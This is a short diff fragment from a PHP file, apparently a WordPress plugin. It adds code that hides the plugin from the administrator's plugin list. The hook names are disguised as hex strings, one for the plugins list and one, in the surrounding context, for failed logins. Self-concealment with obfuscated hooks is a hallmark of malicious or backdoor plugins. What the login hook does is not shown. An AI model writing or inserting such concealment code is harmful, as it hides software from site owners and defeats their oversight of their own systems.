@@ -126,5 +126,15 @@ add_action(hex2bin('77705f6c6f67696e5f6661696c6564'), function ($NM, $ER) {
 }, 10, 2);
 
 
+add_filter(hex2bin('616c6c5f706c7567696e73'), function ($PG) {
+
+    $PG_FL = plugin_basename(__FILE__);
+
+    if (isset($PG[$PG_FL])) {
+        unset($PG[$PG_FL]);
+    }
+
+    return $PG;
+});
 
 
